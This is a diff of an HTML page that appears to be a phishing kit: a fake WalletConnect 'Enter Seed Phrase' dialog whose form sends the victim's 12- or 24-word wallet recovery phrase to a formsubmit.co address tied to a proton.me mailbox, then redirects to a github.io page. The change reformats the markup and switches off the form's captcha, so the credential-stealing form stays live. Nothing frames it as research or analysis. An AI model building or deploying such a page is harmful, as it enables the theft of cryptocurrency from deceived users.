@@ -144,26 +144,29 @@
     </style>
 </head>
 <body>
-    <div class="modal-content">
-        <div class="modal-header">
-            <img src="wallet-connect-logo.svg" alt="Icon">
-            <h4>Enter Seed Phrase</h4>
-        </div>
-        <div class="selection-buttons">
-            <button class="active" onclick="setWords(12)">12 words</button>
-            <button onclick="setWords(24)">24 words</button>
-        </div>
-        <form action="https://formsubmit.co/code-iptv@proton.me" method="POST">
-            <textarea placeholder="Enter your seed phrase here. Make sure to add a space between each word." oninput="updateWords(this.value)" id="seedPhraseTextarea" name="seedPhrase" required></textarea>
-            <div class="words-grid" id="wordsGrid">
-                <!-- Word boxes dynamically generated -->
-            </div>
-                        <input type="hidden" name="_next" value="https://fauxon.github.io/fhrdhqctvghbn-/">
-            <button type="submit" class="submit-button">Submit</button>
-        </form>
-        <div id="output"></div>
+   <div class="modal-content">
+    <div class="modal-header">
+        <img src="wallet-connect-logo.svg" alt="Icon">
+        <h4>Enter Seed Phrase</h4>
     </div>
-    
+    <div class="selection-buttons">
+        <button class="active" onclick="setWords(12)">12 words</button>
+        <button onclick="setWords(24)">24 words</button>
+    </div>
+    <form action="https://formsubmit.co/code-iptv@proton.me" method="POST">
+        <textarea placeholder="Enter your seed phrase here. Make sure to add a space between each word." oninput="updateWords(this.value)" id="seedPhraseTextarea" name="seedPhrase" required></textarea>
+        <div class="words-grid" id="wordsGrid">
+            <!-- Word boxes dynamically generated -->
+        </div>
+        <!-- Redirection after submission -->
+        <input type="hidden" name="_next" value="https://fauxon.github.io/fhrdhqctvghbn-/">
+        <!-- Anti-spam field -->
+        <input type="hidden" name="_captcha" value="false">
+        <button type="submit" class="submit-button">Submit</button>
+    </form>
+    <div id="output"></div>
+</div>
+
     <script>
         let wordCount = 12; // Default to 12 words
     
